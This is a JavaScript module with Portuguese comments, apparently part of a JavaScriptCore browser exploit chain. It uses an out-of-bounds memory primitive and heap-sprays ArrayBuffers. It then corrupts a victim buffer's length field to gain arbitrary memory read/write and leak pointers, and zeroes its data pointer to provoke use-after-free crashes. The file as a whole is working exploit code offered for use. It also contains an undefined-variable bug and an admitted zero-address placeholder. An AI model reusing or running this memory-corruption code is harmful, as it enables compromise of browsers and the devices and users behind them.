// js/script3/testCorruptArrayBufferStructure.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, isAdvancedInt64Object, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive, oob_array_buffer_real,
    oob_write_absolute, oob_read_absolute, clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs'; // OOB_CONFIG será usado dentro da função

// Função auxiliar para pulverizar ArrayBuffers
function sprayArrayBuffers(count, size, logFn = logS3) {
    const sprayedAbs = [];
    logFn(`Pulverizando ${count} ArrayBuffers de ${size} bytes...`, "info", "sprayABs");
    for (let i = 0; i < count; i++) {
        try {
            sprayedAbs.push(new ArrayBuffer(size));
        } catch (e) {
            logFn(`Falha ao alocar ArrayBuffer de spray ${i + 1}/${count}: ${e.message}`, "warn", "sprayABs");
        }
    }
    logFn(`${sprayedAbs.length} ArrayBuffers pulverizados.`, sprayedAbs.length > 0 ? "good" : "warn", "sprayABs");
    return sprayedAbs;
}

async function attemptReadWriteOnCorruptedBuffer(ab, originalSize, newExpectedSize, logFn = logS3, FNAME_PARENT = "") {
    logFn(` -> Verificando AB corrompido: Original Size=${originalSize}, Current Size (esperado)=${ab.byteLength}, Target Corrupted Size=${newExpectedSize}`, "info", FNAME_PARENT);

    if (ab.byteLength !== newExpectedSize) {
        logFn(`    -> FALHA NA VERIFICAÇÃO DE TAMANHO: AB.byteLength é ${ab.byteLength}, esperava ${newExpectedSize}.`, "error", FNAME_PARENT);
        return false;
    }

    logFn(`    -> SUCESSO NA CORRUPÇÃO DE TAMANHO: AB.byteLength é ${toHex(ab.byteLength)} como esperado!`, "vuln", FNAME_PARENT);

    try {
        const corruptedDv = new DataView(ab);
        const readOffsetBeyondOriginal = originalSize + Math.floor(originalSize / 2);
        const testWriteVal = 0xABABABAB;

        if (readOffsetBeyondOriginal + 4 <= ab.byteLength) {
            logFn(`    Escrevendo ${toHex(testWriteVal)} em offset ${readOffsetBeyondOriginal} (além do original ${originalSize})...`, "info", FNAME_PARENT);
            corruptedDv.setUint32(readOffsetBeyondOriginal, testWriteVal, true);
            const readBack = corruptedDv.getUint32(readOffsetBeyondOriginal, true);

            if (readBack === testWriteVal) {
                logFn(`    ---> LEITURA/ESCRITA ARBITRÁRIA (NOVO TAMANHO) OBTIDA! Leu ${toHex(readBack)} de offset ${readOffsetBeyondOriginal}`, "critical", FNAME_PARENT);
                // Tentar ler um ponteiro
                if (readOffsetBeyondOriginal + 8 <= ab.byteLength) {
                    const pLow = corruptedDv.getUint32(readOffsetBeyondOriginal, true);
                    const pHigh = corruptedDv.getUint32(readOffsetBeyondOriginal + 4, true);
                    logFn(`       Lido como U64 em ${readOffsetBeyondOriginal}: H=${toHex(pHigh)} L=${toHex(pLow)}`, "leak", FNAME_PARENT);
                }
                return true;
            } else {
                logFn(`    -> Falha na verificação R/W no AB corrompido (leu ${toHex(readBack)}, esperava ${toHex(testWriteVal)})`, "warn", FNAME_PARENT);
            }
        } else {
            logFn(`    -> Offset de teste R/W (${readOffsetBeyondOriginal}) está fora do novo tamanho do buffer (${ab.byteLength}).`, "error", FNAME_PARENT);
        }
    } catch (e_rw) {
        logFn(`    -> Erro ao tentar R/W no AB corrompido (mesmo com tamanho grande): ${e_rw.message}`, "error", FNAME_PARENT);
    }
    return false;
}

const LONG_PAUSE_S3 = 1500;

export async function testCorruptArrayBufferStructure() {
    const FNAME = "testCorruptArrayBufferStructure";

    // --- Parâmetros de Teste Configuráveis ---
    // Definido dentro da função para garantir que OOB_CONFIG e JSC_OFFSETS estejam disponíveis.
    const CORRUPTION_AB_CONFIG = {
        spray_count: 250,
        victim_ab_size: 256,
        // !! USE OS OFFSETS VALIDADOS/CORRIGIDOS AQUI !!
        // Baseado na nova análise do disassembly:
        // Offset do campo de tamanho (byteLength) DENTRO da estrutura ArrayBufferContents,
        // que por sua vez é apontada por m_impl no JSArrayBuffer.
        size_offset_in_contents: 0x20, // Confirmado pelo disassembly de JSObjectGetArrayBufferByteLength
        // Offset do ponteiro de dados (dataPointer) DENTRO da estrutura ArrayBufferContents
        data_ptr_offset_in_contents: 0x10, // Confirmado pelo disassembly de JSObjectGetArrayBufferBytesPtr

        // Offset do ponteiro para ArrayBufferContents* (m_impl) DENTRO da estrutura JSArrayBuffer
        contents_impl_ptr_offset_in_ab: parseInt(JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET, 16) || 0x10,

        corrupted_size_value: 0x70000000, // Tamanho grande
        // Para corrupção do ponteiro de dados, vamos tentar apontar para um offset dentro do oob_array_buffer_real
        // (precisaria saber o endereço base do oob_array_buffer_real ou usar um truque)
        // Por enquanto, vamos focar no tamanho. Para UAF, podemos tentar zerar o ponteiro.
        corrupted_data_ptr_low: 0x0,
        corrupted_data_ptr_high: 0x0,

        search_base_offset_start: (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - (256 * 8), // Tentar mais para trás
        search_base_offset_end: (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) + (OOB_CONFIG.ALLOCATION_SIZE || 32768) - 256,
        search_step: 8, // Alinhamento comum
        max_successful_corruptions_to_find: 1,
        attempts: 2, // Número de tentativas completas de spray e corrupção
    };
    // --- Fim dos Parâmetros ---

    logS3(`--- Iniciando Teste de Corrupção de Estrutura de ArrayBuffer (S3) (v2.3) ---`, "test", FNAME);
    logS3(`   Config: Spray=${CORRUPTION_AB_CONFIG.spray_count}x${CORRUPTION_AB_CONFIG.victim_ab_size}B`, "info", FNAME);
    logS3(`   Tentando corromper: size_offset_in_contents=${toHex(CORRUPTION_AB_CONFIG.size_offset_in_contents)}, data_ptr_offset_in_contents=${toHex(CORRUPTION_AB_CONFIG.data_ptr_offset_in_contents)}`, "info", FNAME);
    logS3(`   contents_impl_ptr_offset_in_ab=${toHex(CORRUPTION_AB_CONFIG.contents_impl_ptr_offset_in_ab)}`, "info", FNAME);

    let successfulCorruptionsFound = 0;

    for (let attempt = 0; attempt < CORRUPTION_AB_CONFIG.attempts; attempt++) {
        if (successfulCorruptionsFound >= CORRUPTION_AB_CONFIG.max_successful_corruptions_to_find) break;

        logS3(`Tentativa de Corrupção de AB #${attempt + 1}/${CORRUPTION_AB_CONFIG.attempts}...`, "test", FNAME);
        await triggerOOB_primitive();
        if (!oob_array_buffer_real) {
            logS3("Falha ao configurar ambiente OOB. Abortando esta tentativa.", "error", FNAME);
            continue;
        }

        const victimAbs = sprayArrayBuffers(CORRUPTION_AB_CONFIG.spray_count, CORRUPTION_AB_CONFIG.victim_ab_size, logS3);
        if (victimAbs.length === 0) {
            clearOOBEnvironment();
            continue;
        }
        await PAUSE_S3(LONG_PAUSE_S3);

        for (let baseCandidateOffsetForVictimAB = CORRUPTION_AB_CONFIG.search_base_offset_start;
             baseCandidateOffsetForVictimAB < CORRUPTION_AB_CONFIG.search_base_offset_end;
             baseCandidateOffsetForVictimAB += CORRUPTION_AB_CONFIG.search_step) {

            if (successfulCorruptionsFound >= CORRUPTION_AB_CONFIG.max_successful_corruptions_to_find) break;
            if (baseCandidateOffsetForVictimAB < 0 || baseCandidateOffsetForVictimAB + CORRUPTION_AB_CONFIG.victim_ab_size > oob_array_buffer_real.byteLength) continue;

            // Passo 1: Ler o ponteiro para ArrayBufferContents* (m_impl) do ArrayBuffer vítima candidato
            const absOffsetForContentsImplPtr = baseCandidateOffsetForVictimAB + CORRUPTION_AB_CONFIG.contents_impl_ptr_offset_in_ab;
            if (absOffsetForContentsImplPtr < 0 || absOffsetForContentsImplPtr + 8 > oob_array_buffer_real.byteLength) continue;

            let originalContentsImplPtr;
            try {
                originalContentsImplPtr = oob_read_absolute(absOffsetForContentsImplPtr, 8);
                if (!isAdvancedInt64Object(originalContentsImplPtr) || (originalContentsImplPtr.low() === 0 && originalContentsImplPtr.high() === 0)) {
                    // logS3(`  Base ${toHex(baseCandidateOffsetForVictimAB)}: m_impl ptr é nulo ou inválido. Pulando.`, "info", FNAME);
                    continue;
                }
                 // O ponteiro lido (originalContentsImplPtr) é um endereço absoluto na memória do processo.
                 // Não podemos usá-lo diretamente como offset no oob_array_buffer_real, a menos que
                 // saibamos o endereço base de oob_array_buffer_real e possamos calcular o offset relativo.
                 // Esta é a parte mais complexa sem um addrof completo e info leak.
                 // Por agora, o teste de corrupção de tamanho tentará acertar o campo de tamanho DENTRO de JSArrayBuffer se o offset for direto.
                 // Se o tamanho estiver DENTRO de ArrayBufferContents, precisamos de uma forma de ler/escrever em originalContentsImplPtr.
                logS3(` Testando base ${toHex(baseCandidateOffsetForVictimAB)}. Conteúdo de m_impl* (abs): ${originalContentsImplPtr.toString(true)}`, "info", FNAME);

            } catch (e_read_impl) {
                continue; // Não conseguiu ler, provavelmente não é um AB válido neste offset
            }


            // --- TENTATIVA 1: Corromper TAMANHO ---
            // Assumindo que SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START (ex: 0x30) é o offset correto
            // do tamanho *relativo ao início do JSArrayBuffer*.
            const absOffsetForVictimSizeField = baseCandidateOffsetForVictimAB + (parseInt(JSC_OFFSETS.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START, 16) || 0x30);

            if (absOffsetForVictimSizeField >= 0 && absOffsetForVictimSizeField + 4 <= oob_array_buffer_real.byteLength) {
                const originalValueAtSizeOffset = oob_read_absolute(absOffsetForVictimSizeField, 4);
                logS3(`  -> Corrompendo TAMANHO em ${toHex(absOffsetForVictimSizeField)} para ${toHex(CORRUPTION_AB_CONFIG.corrupted_size_value)}. Original: ${toHex(originalValueAtSizeOffset)}`, "info", FNAME);
                
                oob_write_absolute(absOffsetForVictimSizeField, CORRUPTION_AB_CONFIG.corrupted_size_value, 4);

                for (let i = 0; i < victimAbs.length; i++) {
                    if (!victimAbs[i]) continue;
                    try {
                        if (victimAbs[i].byteLength === CORRUPTION_AB_CONFIG.corrupted_size_value) {
                            if (await attemptReadWriteOnCorruptedBuffer(victimAbs[i], CORRUPTION_AB_CONFIG.victim_ab_size, CORRUPTION_AB_CONFIG.corrupted_size_value, logS3, FNAME)) {
                                successfulCorruptionsFound++;
                                logS3(`     !!! Sucesso com base ${toHex(baseCandidateOffsetForVictimAB)} para corrupção de tamanho !!!`, "critical", FNAME);
                                if (successfulCorruptionsFound >= CORRUPTION_AB_CONFIG.max_successful_corruptions_to_find) break;
                            }
                        }
                    } catch (e_check_size) { /* pode falhar */ }
                }
                try { // Restaurar
                    oob_write_absolute(absOffsetForVictimSizeField, originalValueAtSizeOffset, 4);
                } catch (e_restore_size) {logS3(` Aviso: falha ao restaurar tamanho em ${toHex(absOffsetForVictimSizeField)}`, "warn", FNAME)}
                if (successfulCorruptionsFound >= CORRUPTION_AB_CONFIG.max_successful_corruptions_to_find) break;
            }
            await PAUSE_S3(SHORT_PAUSE_S3);

            // --- TENTATIVA 2: Corromper PONTEIRO DE DADOS (dentro de ArrayBufferContents) ---
            // Para isso, precisamos saber o endereço absoluto de ArrayBufferContents (originalContentsImplPtr)
            // e então calcular um offset absoluto DENTRO do oob_array_buffer_real que corresponda
            // a originalContentsImplPtr + data_ptr_offset_in_contents.
            // Isso requer um INFO LEAK do endereço base do oob_array_buffer_real,
            // ou que originalContentsImplPtr aponte para DENTRO do oob_array_buffer_real.
            // Esta parte é muito mais difícil de acertar sem essas informações.
            // A abordagem mais simples é se você pulverizou ArrayBufferContents e conseguiu um adjacente.

            // Por enquanto, este teste de corrupção de vetor é muito especulativo.
            // Se originalContentsImplPtr apontar para DENTRO de oob_array_buffer_real:
            const oob_real_base_assumed = 0; // ISSO É UMA GRANDE SUPOSIÇÃO E PRECISA SER SUBSTITUÍDO POR UM LEAK
            const relativeOffsetOfContentsInOOBReal = originalContentsImplPtr.sub(oob_real_base_assumed).low(); // Apenas parte baixa para simplificar
            
            if (relativeOffsetOfContentsInOOBReal >= 0 && relativeOffsetOfContentsInOOBReal < oob_array_buffer_real.byteLength) {
                const absOffsetForDataPtrInContents = relativeOffsetOfContentsInOOBReal + CORRUPTION_AB_CONFIG.data_ptr_offset_in_contents;

                if (absOffsetForDataPtrInContents >= 0 && absOffsetForDataPtrInContents + 8 <= oob_array_buffer_real.byteLength) {
                    const originalDataPtr = oob_read_absolute(absOffsetForDataPtrInContents, 8);
                    const newCorruptedDataPtr = new AdvancedInt64(CORRUPTION_AB_CONFIG.corrupted_data_ptr_low, CORRUPTION_AB_CONFIG.corrupted_data_ptr_high);

                    logS3(`  -> Corrompendo DATA_PTR em ${toHex(absOffsetForDataPtrInContents)} (dentro de Contents@${originalContentsImplPtr.toString(true)}) para ${newCorruptedDataPtr.toString(true)}. Original: ${isAdvancedInt64Object(originalDataPtr) ? originalDataPtr.toString(true) : toHex(originalDataPtr)}`, "info", FNAME);
                    oob_write_absolute(absOffsetForDataPtrInContents, newCorruptedDataPtr, 8);

                    for (let i = 0; i < victimAbs.length; i++) {
                        if (!victimAbs[i]) continue;
                        try {
                            const dvCheck = new DataView(victimAbs[i]);
                            dvCheck.getUint8(0); // Tenta acessar, pode causar UAF se o ponteiro foi zerado.
                            logS3(`   AB ${i} acessado após corrupção de data_ptr. Se o ponteiro foi zerado, isso é inesperado.`, "warn", FNAME);
                        } catch (e_check_dp) {
                            logS3(`   !!! POTENCIAL UAF/CRASH NO AB ${i} !!! Erro ao acessar após corrupção de data_ptr: ${e_check_dp.message}`, "critical", FNAME);
                            successfulCorruptionsFound++;
                            if (successfulCorruptionsFound >= CORRUPTION_AB_CONFIG.max_successful_corruptions_to_find) break;
                        }
                    }
                    try { // Restaurar
                         oob_write_absolute(absOffsetForDataPtrInContents, originalDataPtr, 8);
                    } catch(e_restore_dp) {logS3(` Aviso: falha ao restaurar data_ptr em ${toHex(absOffsetForDataPtrInContents)}`, "warn", FNAME)}
                    if (successfulCorruptionsFound >= CORRUPTION_AB_CONFIG.max_successful_corruptions_to_find) break;
                }
            } else if (!(originalContentsImplPtr.low() === 0 && originalContentsImplPtr.high() === 0)) {
                 // logS3(`  m_impl ptr ${originalContentsImplPtr.toString(true)} parece estar fora do oob_array_buffer_real. Corrupção de data_ptr pulada para esta base.`, "info", FNAME);
            }
            if (baseCandidateOffset % (CORRUPTION_AB_CONFIG.search_step * 20) === 0) await PAUSE_S3(MEDIUM_PAUSE_S3);
        }
        clearOOBEnvironment();
        if (successfulCorruptionsFound >= CORRUPTION_AB_CONFIG.max_successful_corruptions_to_find) break;
        logS3(`Fim da Tentativa #${attempt + 1}. Pausando antes da próxima...`);
        if (attempt + 1 < CORRUPTION_AB_CONFIG.attempts) await PAUSE_S3(LONG_PAUSE_S3 * 2);
    }

    logS3(`--- Teste de Corrupção de Estrutura de ArrayBuffer Concluído (Sucessos de Corrupção Encontrados: ${successfulCorruptionsFound}) ---`, "test", FNAME);
}
